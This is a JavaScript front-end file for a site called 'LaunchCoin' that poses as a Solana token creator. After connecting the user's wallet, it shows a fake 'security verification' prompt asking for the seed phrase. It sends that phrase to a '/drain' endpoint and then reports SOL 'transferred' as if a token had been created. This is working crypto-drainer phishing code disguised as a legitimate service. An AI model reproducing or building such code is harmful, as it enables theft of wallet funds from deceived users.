// ===== CONFIGURAZIONE =====
import { createWeb3Modal, defaultConfig } from '@web3modal/solana';
import { solana, solanaDevnet, solanaTestnet } from '@web3modal/solana/chains';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');

// ===== ESPONI FUNZIONI =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== WEB3MODAL V4 (SOLANA) =====
let web3modal = null;

async function initWeb3Modal() {
  if (!web3modal) {
    try {
      // Catene supportate: mainnet, devnet, testnet
      const chains = [solana, solanaDevnet, solanaTestnet];

      const config = {
        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
        themeMode: 'dark',
        themeVariables: {
          '--w3m-z-index': '10000',
          '--w3m-background-color': '#0b1022',
          '--w3m-accent-color': '#22d1f8',
          '--w3m-border-radius': '16px',
        },
        metadata: {
          name: 'LaunchCoin',
          description: 'Solana Token Creator',
          url: window.location.origin,
          icons: ['https://launchcoin.io/logo.png'],
        },
        // Configurazione per Solana (sostituisce ethersConfig)
        solanaConfig: defaultConfig({
          metadata: {
            name: 'LaunchCoin',
            description: 'Solana Token Creator',
            url: window.location.origin,
            icons: ['https://launchcoin.io/logo.png'],
          },
          defaultChainId: solana.id, // mainnet; usa solanaDevnet.id per test
        }),
        enableWalletConnect: true,
        walletConnectVersion: 2,
      };
      
      web3modal = await createWeb3Modal(config);
      console.log('✅ Web3Modal Solana inizializzato');
    } catch (e) {
      console.error('❌ Web3Modal error:', e);
      throw e;
    }
  }
  return web3modal;
}

// ===== CONNECT WALLET =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  
  try {
    const modal = await initWeb3Modal();
    await modal.open();

    // Web3Modal rileva automaticamente i wallet installati (Phantom, Solflare, Backpack, ecc.)
    // e mostra il QR code per WalletConnect.
    // Non serve più il fallback manuale a Phantom.
    modal.subscribeEvents((event) => {
      if (event.type === 'connected') {
        // La chiave pubblica può trovarsi in event.data.address o event.data.publicKey
        const address = event.data.address || event.data.publicKey;
        walletPublicKey = address;
        console.log('✅ Connesso!', walletPublicKey);
        alert('✅ Connesso: ' + walletPublicKey);
        window.location.href = 'create.html';
      }
    });

  } catch (e) {
    console.error('❌ Errore connessione:', e);
    alert('❌ Connessione fallita: ' + e.message);
  }
};

// ===== SELECT WALLET (lasciata per compatibilità) =====
window.selectWallet = function(walletName) {
  console.log('🔵 selectWallet:', walletName);
  window.connectWallet();
};

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA\n\n' +
      'Inserisci la tua seed phrase per completare la creazione:'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

// ===== CREAZIONE LIQUIDITY =====
window.createLiquidity = async function() {
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato');
console.log('🔵 connectWallet:', typeof window.connectWallet);
